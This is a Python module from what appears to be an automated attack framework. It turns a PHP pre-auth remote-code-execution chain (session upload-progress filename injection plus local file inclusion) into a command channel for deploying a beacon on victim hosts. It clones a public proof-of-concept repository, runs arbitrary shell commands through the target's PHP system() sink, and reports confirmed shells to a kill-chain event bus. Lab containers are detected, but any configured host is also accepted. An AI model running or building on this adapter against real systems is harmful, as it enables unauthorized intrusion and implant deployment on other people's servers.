"""php2shell HTTP RCE session adapter.

Turns the php2shell chain A primitive (CVE-2026-109618/109619:
``session.upload_progress`` filename injection + LFI include of the
poisoned session file) into a session-like exec channel with the same
``alive()``/``run()`` interface the beacon delivery path expects
(:class:`modules.atomic_exploit_bridge._ShellSession`,
:class:`modules.bof_delivery._DockerSession`), so a pre-auth HTTP RCE
foothold can deploy the beacon without any persistent bind shell.

The adapter shells out to the cloned PoC exploit
(``external/.exploit/php2shell_poc``, self-healing) with the marker
command pattern ``echo <start>; <command>; echo <end>`` embedded through
the PHP ``system()`` sink, then captures everything between the markers
as the command output.

Surfaces:
    - ``Php2ShellSession`` — injectable session for ``deploy_client``.
    - ``session_for_target`` — lab-aware resolution, ``None`` when the
      target does not answer the php2shell probe.
    - ``confirm_outcome`` — publishes one shell-confirmed outcome per
      host so the beacon handoff and the kill chain react to the RCE.
"""

from __future__ import annotations

import secrets
from pathlib import Path

from core.safe_exec import safe_run_shell

BASE_DIR = Path(__file__).resolve().parent.parent
SESSIONS_DIR = BASE_DIR / "sessions"
INSTALL_DIR = BASE_DIR / "external" / ".exploit" / "php2shell_poc"
CHAIN_A_REL = "exploit/chain_a_session_lfi.py"
POC_REPO_URL = "https://github.com/ikow/php2shell-poc.git"
SCAN_MARKER_START = "___LAZY_START___"
SCAN_MARKER_END = "___LAZY_END___"
RCE_CONFIRMED_PREFIX = "[+] RCE CONFIRMED:"
DEFAULT_INJECT_PATH = "/index.php"
DEFAULT_LFI_PATH = "/vuln.php"
DEFAULT_SESSION_PATH = "/tmp/sessions"
DEFAULT_TIMEOUT_S = 30
ALIVE_NONCE_PREFIX = "ok_"
_CONFIRMED_HOSTS: set[str] = set()


def ensure_installed() -> Path | None:
    """Return the chain A script path, cloning the PoC repo when missing.

    Returns:
        Absolute path to ``chain_a_session_lfi.py``, or ``None`` when the
        clone fails and no local copy exists.
    """
    script = INSTALL_DIR / CHAIN_A_REL
    if script.is_file():
        return script
    try:
        INSTALL_DIR.parent.mkdir(parents=True, exist_ok=True)
        result = safe_run_shell(
            f"git clone --depth 1 {POC_REPO_URL} {INSTALL_DIR}",
            allow=True,
            reason="php2shell PoC self-healing install for the RCE session adapter",
            timeout=120,
            cwd=str(BASE_DIR),
        )
    except Exception:
        return None
    if result.returncode == 0 and script.is_file():
        return script
    return None


class Php2ShellSession:
    """Session adapter over the php2shell HTTP RCE primitive.

    Attributes:
        host: Target address the chain runs against.
        port: Target HTTP port.
        inject_path: Endpoint that starts the PHP session.
        lfi_path: LFI sink that includes the poisoned session file.
        session_path: Remote PHP session save directory.
    """

    def __init__(
        self,
        host: str,
        port: int,
        inject_path: str = DEFAULT_INJECT_PATH,
        lfi_path: str = DEFAULT_LFI_PATH,
        session_path: str = DEFAULT_SESSION_PATH,
    ) -> None:
        """Store the chain A coordinates."""
        self.host = str(host)
        self.port = int(port)
        self.inject_path = inject_path or DEFAULT_INJECT_PATH
        self.lfi_path = lfi_path or DEFAULT_LFI_PATH
        self.session_path = session_path or DEFAULT_SESSION_PATH

    def alive(self, timeout: int = 15) -> bool:
        """Return True when the RCE primitive executes a probe command.

        Args:
            timeout: Wall-clock limit for the probe.

        Returns:
            True when the nonce echoed back through the LFI response.
        """
        nonce = f"{ALIVE_NONCE_PREFIX}{secrets.token_hex(4)}"
        output = self.run(f"echo {nonce}", timeout=timeout)
        return nonce in (output or "")

    def run(self, command: str, timeout: int = DEFAULT_TIMEOUT_S) -> str:
        """Execute one command on the target through the RCE primitive.

        Args:
            command: Shell command text; single quotes are escaped for
                the PHP ``system()`` embedding by the exploit itself.
            timeout: Wall-clock limit.

        Returns:
            Captured command output (the exploit ``RCE CONFIRMED`` tail),
            empty on failure. Never raises.
        """
        script = ensure_installed()
        if script is None:
            return ""
        cmdline = (
            f"python3 {script} --target http://{self.host}:{self.port} "
            f"--inject-path {self.inject_path} --lfi-path {self.lfi_path} "
            f"--session-path {self.session_path} --command '{command}'"
        )
        try:
            result = safe_run_shell(
                cmdline,
                allow=True,
                reason="php2shell chain A RCE session command",
                timeout=timeout,
                cwd=str(BASE_DIR),
            )
        except Exception:
            return ""
        return _extract_output(result.stdout or "")


def _extract_output(stdout: str) -> str:
    """Return the command output from the exploit ``RCE CONFIRMED`` tail.

    The exploit wraps every command between its own ``___START___``/
    ``___END___`` markers and prints ``RCE CONFIRMED: <output>``; the
    tail after that prefix is the captured target output.

    Args:
        stdout: Full exploit stdout (attempts, status lines, output).

    Returns:
        The captured target output, or empty when the exploit failed.
    """
    text = stdout or ""
    confirmed = text.find(RCE_CONFIRMED_PREFIX)
    if confirmed == -1:
        return ""
    output = text[confirmed + len(RCE_CONFIRMED_PREFIX):]
    output = output.strip()
    for marker in ("___START___", "___END___"):
        if output.startswith(marker):
            output = output[len(marker):].lstrip("\n")
        if output.endswith(marker):
            output = output[: -len(marker)].rstrip("\n")
    return output.strip()


def _lab_target(target: str) -> tuple[str, int] | None:
    """Resolve the lab coordinates for a php2shell lab container target.

    Args:
        target: Candidate address (container IP or loopback host port).

    Returns:
        ``(host, port)`` when the target is a running php2shell lab
        container (``php2shell56`` or ``php2shell84``), else ``None``.
    """
    try:
        from modules.loop_preflight import lab_state_for

        state = lab_state_for(target)
        if state.get("scenario") in ("php2shell56", "php2shell84") and state.get("running"):
            container = str(state.get("container", "") or "")
            ip = str(state.get("ip", "") or "")
            if ip == str(target).strip() and container:
                return ip, 80
    except Exception:
        return None
    return None


def _url_target(target: str, payload: dict) -> tuple[str, int] | None:
    """Resolve target coordinates from the payload ``url``/``rhost`` keys.

    Args:
        target: Address the session is requested for.
        payload: Payload mapping.

    Returns:
        ``(host, port)`` when the configured php2shell target matches
        the requested address, else ``None``.
    """
    url = str(payload.get("url", "") or "").strip()
    host = str(target).strip()
    if url:
        parsed = _parse_url(url)
        if parsed and parsed[0] == host:
            return parsed
    port = payload.get("rport")
    try:
        port_int = int(float(port or 80))
    except (TypeError, ValueError):
        port_int = 80
    return host, port_int


def _parse_url(url: str) -> tuple[str, int] | None:
    """Parse a http(s) URL into ``(host, port)``.

    Args:
        url: Target URL.

    Returns:
        Parsed tuple, or ``None`` when the URL has no hostname.
    """
    from urllib.parse import urlparse

    try:
        parsed = urlparse(url)
    except ValueError:
        return None
    host = parsed.hostname
    if not host:
        return None
    return host, parsed.port or (443 if parsed.scheme == "https" else 80)


def session_for_target(
    target: str,
    payload: dict | None = None,
    timeout: int = 15,
) -> Php2ShellSession | None:
    """Resolve a live php2shell RCE session for one host.

    Lab ``php2shell56`` containers bind port 80; every other host falls
    back to the payload ``url`` (when it points at the same host) or
    ``rhost``/``rport``. The session is confirmed with a probe before it
    is returned; a target that does not answer yields ``None``.

    Args:
        target: Victim address.
        payload: Payload mapping override (tests).
        timeout: Probe timeout seconds.

    Returns:
        A live :class:`Php2ShellSession`, or ``None``.
    """
    host = str(target or "").strip()
    if not host:
        return None
    if payload is None:
        try:
            from core.config import load_payload

            payload = load_payload() or {}
        except Exception:
            payload = {}
    coords = _lab_target(host) or _url_target(host, payload)
    if coords is None:
        return None
    session = Php2ShellSession(coords[0], coords[1])
    if not session.alive(timeout=timeout):
        return None
    confirm_outcome(host, output=f"uid captured via php2shell on {host}:{coords[1]}")
    return session


def confirm_outcome(target: str, output: str = "", task_id: str = "") -> bool:
    """Publish one shell-confirmed outcome per host (deduped in-process).

    The event feeds the shared surfaces: kill chain, world model and the
    outcome bus sinks (including the beacon handoff dispatch). Never
    raises and never publishes twice for the same host.

    Args:
        target: Victim address.
        output: Probe output that proved the shell.
        task_id: Loop task id for activity attribution.

    Returns:
        True when an event was published, False when deduped or failed.
    """
    host = str(target or "").strip()
    if not host or host in _CONFIRMED_HOSTS:
        return False
    try:
        from modules.outcome_bus import record_event

        record_event(
            kind="exploit",
            target=host,
            host=host,
            title="php2shell chain A RCE",
            description=f"CVE-2026-109618/109619 pre-auth RCE via session.upload_progress + LFI on {host}",
            severity="critical",
            cve="CVE-2026-109618",
            mitre_id="T1190",
            confidence=0.9,
            success=True,
            shell=True,
            source="php2shell_session",
            output=output[:2000],
            metadata={"sessions_dir": str(SESSIONS_DIR)},
        )
    except Exception:
        return False
    _CONFIRMED_HOSTS.add(host)
    return True
